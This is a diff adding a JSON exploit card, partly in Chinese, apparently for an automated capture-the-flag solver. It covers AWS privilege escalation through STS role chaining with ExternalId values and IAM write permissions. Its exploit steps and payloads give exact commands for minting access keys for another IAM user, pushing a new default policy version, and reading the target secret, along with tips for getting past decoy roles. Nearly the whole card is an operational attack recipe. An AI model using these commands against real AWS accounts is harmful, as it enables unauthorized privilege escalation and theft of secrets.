@@ -1,0 +1,47 @@
+{
+  "id": "aws-sts-chain-iam-privesc",
+  "title": "STS 多跳角色链 + IAM 写权限提权",
+  "vuln_pattern": "sts assumerole chain + iam-write privesc",
+  "fingerprint": [
+    "sts:AssumeRole ExternalId",
+    "role chain",
+    "iam:CreateAccessKey",
+    "iam:CreatePolicyVersion SetAsDefault",
+    "AttachRolePolicy denied",
+    "status=LIVE/ACTIVE record among decoys",
+    "提权",
+    "权限提升",
+    "越权",
+    "未授权",
+    "云权限",
+    "云环境",
+    "云"
+  ],
+  "exploit_steps": [
+    "找唯一活针(status=LIVE/ACTIVE)——config-as-loot：拿到 role ARN + ExternalId + 目标名",
+    "s.assume(role_arn, external_id=...) 逐跳；ExternalId 必填、来自活记录",
+    "角色不可直接 assume 时：找当前身份的 IAM 写权限——iam:CreateAccessKey(给受信用户凭空造 key=变成它) 或 iam:CreatePolicyVersion --set-as-default(给已附加策略注入新默认版本)",
+    "改策略后旧临时凭证不带新权限——整条链从头 assume 重走",
+    "终点角色 secretsmanager get-secret-value 取 flag"
+  ],
+  "key_payloads": [
+    "s2 = s.assume('arn:...:role/scanner', external_id='eastreach-road-scanner-3d9c')",
+    "aws iam create-access-key --user-name road-messenger",
+    "aws iam create-policy-version --policy-arn ARN --policy-document file://p.json --set-as-default"
+  ],
+  "category": "cloud",
+  "cve": [],
+  "tags": [],
+  "source": "original: v2 §10.4 cloud card",
+  "created_ts": 1786489746.585334,
+  "preconditions": [
+    "一堆记录里只有 status=LIVE/ACTIVE 那条带下一跳配置(role ARN+ExternalId+bucket/key/secret)，其余是命名诱饵"
+  ],
+  "verify_oracle": "终点角色成功 get-secret-value / 读到目标 secret 即 flag",
+  "pitfalls": [
+    "AttachRolePolicy/PutRolePolicy 是被拒诱饵",
+    "假角色能 assume 但零权限——唯一 assume 失败的才是真受限目标，别在宽松假角色上耗",
+    "改策略后必须整条链重走(临时凭证已失效)",
+    "策略版本满 5 个 → 先删非默认版本"
+  ]
+}
